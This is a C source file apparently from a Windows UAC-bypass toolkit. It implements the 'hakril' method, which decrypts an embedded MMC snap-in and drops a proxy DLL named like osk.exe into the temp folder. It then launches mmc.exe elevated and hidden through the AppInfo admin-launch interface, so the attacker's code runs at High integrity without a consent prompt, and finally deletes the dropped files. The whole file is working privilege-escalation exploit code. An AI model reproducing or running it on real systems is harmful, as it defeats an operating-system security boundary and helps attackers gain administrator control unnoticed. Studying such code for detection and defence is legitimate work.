/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2022
*
*  TITLE:       HAKRIL.C
*
*  VERSION:     3.61
*
*  DATE:        22 Jun 2022
*
*  UAC bypass method from Clement Rouault aka hakril.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "encresource.h"

typedef ULONG_PTR(WINAPI* pfnAipFindLaunchAdminProcess)(
    LPWSTR lpApplicationName,
    LPWSTR lpParameters,
    DWORD UacRequestFlag,
    DWORD dwCreationFlags,
    LPWSTR lpCurrentDirectory,
    HWND hWnd,
    PVOID StartupInfo,
    PVOID ProcessInfo,
    ELEVATION_REASON* ElevationReason);

/*
* ucmHakrilMethod
*
* Purpose:
*
* Bypass UAC by abusing "feature" of appinfo command line parser.
* (all bugs are features/not a boundary of %something% by MS philosophy)
* Command line parser logic allows execution of custom snap-in console as if it
* "trusted" by Microsoft, resulting in your code running inside MMC.exe on High IL.
*
* Trigger: custom console snap-in with shockwave flash object resulting in
* execution of remote script on local machine with High IL.
*
*/
NTSTATUS ucmHakrilMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    ULONG DataSize = 0, SnapinSize = 0;
    SIZE_T Dummy, MscBufferSize = 0, MscSize = 0, MscBytesIO = 0;
    PVOID SnapinResource = NULL, SnapinData = NULL, MscBufferPtr = NULL;
    PVOID ImageBaseAddress = g_hInstance;  
    CHAR *pszMarker;

    WCHAR szBuffer[MAX_PATH * 2];
    WCHAR szParams[MAX_PATH * 3];
    CHAR szConvertedBuffer[MAX_PATH * 2];

    PROCESS_INFORMATION procInfo;

    do { 

        //
        // Decrypt and decompress custom Kamikaze snap-in.
        //
        SnapinResource = supLdrQueryResourceData(
            KAMIKAZE_ID,
            ImageBaseAddress,
            &DataSize);

        if (SnapinResource) {
            SnapinData = g_ctx->DecompressRoutine(KAMIKAZE_ID, SnapinResource, DataSize, &SnapinSize);
            if (SnapinData == NULL)
                break;
        }
        else
            break;

        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            FUBUKI_DEFAULT_ENTRYPOINT,
            TRUE))
        {
            break;
        }

        //
        // Write Fubuki to the %temp%
        //
        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        Dummy = _strlen(szBuffer);
        _strcat(szBuffer, OSK_EXE);

        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
            break;

        //
        // Build filename for launcher.
        //
        szBuffer[Dummy] = 0;
        _strcat(szBuffer, KAMIKAZE_LAUNCHER);

        MscBufferSize = ALIGN_UP_BY(SnapinSize + sizeof(szBuffer), PAGE_SIZE);
        MscBufferPtr = supVirtualAlloc(
            &MscBufferSize,
            DEFAULT_ALLOCATION_TYPE,
            DEFAULT_PROTECT_TYPE, NULL);
        if (MscBufferPtr == NULL)
            break;

        //
        // Converted filename to ANSI to be used in msc modification next.
        //
        RtlSecureZeroMemory(szConvertedBuffer, sizeof(szConvertedBuffer));
        WideCharToMultiByte(CP_ACP, 0, szBuffer, -1, szConvertedBuffer, sizeof(szConvertedBuffer), NULL, NULL);

        //
        // Write launcher to the %temp%
        //
        if (!supDecodeAndWriteBufferToFile(szBuffer,
            (CONST PVOID)g_encodedKamikazeFinal,
            sizeof(g_encodedKamikazeFinal),
            'kmkz'))
        {
            break;
        }

        //
        // Build Kamikaze filename.
        //
        szBuffer[Dummy] = 0;
        _strcat(szBuffer, KAMIKAZE_MSC);

        //
        // Reconfigure msc snapin and write it to the %temp%.
        //
        pszMarker = _strstri_a((CHAR*)SnapinData, (const CHAR*)KAMIKAZE_MARKER);
        if (pszMarker) {

            //
            // Copy first part of snapin (unchanged).
            //
            MscBytesIO = (ULONG)(pszMarker - (PCHAR)SnapinData);
            MscSize = MscBytesIO;
            RtlCopyMemory(MscBufferPtr, SnapinData, MscBytesIO);

            //
            // Copy modified part.
            //
            MscBytesIO = (ULONG)_strlen_a(szConvertedBuffer);
            RtlCopyMemory(RtlOffsetToPointer(MscBufferPtr, MscSize), (PVOID)&szConvertedBuffer, MscBytesIO);
            MscSize += MscBytesIO;

            //
            // Copy all of the rest.
            //
            while (*pszMarker != 0 && *pszMarker != '<') {
                pszMarker++;
            }

            MscBytesIO = (ULONG)(((PCHAR)SnapinData + SnapinSize) - pszMarker);
            RtlCopyMemory(RtlOffsetToPointer(MscBufferPtr, MscSize), pszMarker, MscBytesIO);
            MscSize += MscBytesIO;

            //
            // Write result to the file.
            //
            if (!supWriteBufferToFile(szBuffer, MscBufferPtr, (ULONG)MscSize))
                break;

            supSecureVirtualFree(MscBufferPtr, MscBufferSize, NULL);
            MscBufferPtr = NULL;
        }

        //
        // Prepare snap-in parameters.
        //

        _strcpy(szParams, TEXT("lzx32,wf.msc \""));
        _strcat(szParams, szBuffer);
        _strcat(szParams, TEXT("\""));

        _strcpy(szBuffer, g_ctx->szSystemDirectory);
        _strcat(szBuffer, MMC_EXE);
        
        //
        // Run trigger application.
        //
        if (AicLaunchAdminProcess(szBuffer,
            szParams,
            1, //elevate
            CREATE_UNICODE_ENVIRONMENT | CREATE_SUSPENDED,
            g_ctx->szSystemRoot,
            T_DEFAULT_DESKTOP,
            NULL,
            INFINITE,
            SW_HIDE,
            &procInfo))
        {
            if (procInfo.hThread) {
                ResumeThread(procInfo.hThread);
                CloseHandle(procInfo.hThread);
            }
            if (procInfo.hProcess) {
                if (WaitForSingleObject(procInfo.hProcess, 5000) == WAIT_TIMEOUT)
                    TerminateProcess(procInfo.hProcess, 0);
                CloseHandle(procInfo.hProcess);
            }

            MethodResult = STATUS_SUCCESS;
        }

    } while (FALSE);

    //
    // Cleanup.
    //
    if (MscBufferPtr) {
        supSecureVirtualFree(MscBufferPtr, MscBufferSize, NULL);
    }
    if (SnapinData) {
        supSecureVirtualFree(SnapinData, SnapinSize, NULL);
    }

    return MethodResult;
}

/*
* ucmHakrilMethodCleanup
*
* Purpose:
*
* Post execution cleanup routine for HakrilMethod
*
*/
BOOL ucmHakrilMethodCleanup(
    VOID
)
{
    SIZE_T Dummy;
    WCHAR szBuffer[MAX_PATH * 2];

    _strcpy(szBuffer, g_ctx->szTempDirectory);
    Dummy = _strlen(szBuffer);
    _strcat(szBuffer, KAMIKAZE_MSC);
    DeleteFile(szBuffer);

    Sleep(1000);

    szBuffer[Dummy] = 0;
    _strcat(szBuffer, KAMIKAZE_LAUNCHER);
    DeleteFile(szBuffer);

    szBuffer[Dummy] = 0;
    _strcat(szBuffer, OSK_EXE);
    return DeleteFile(szBuffer);
}
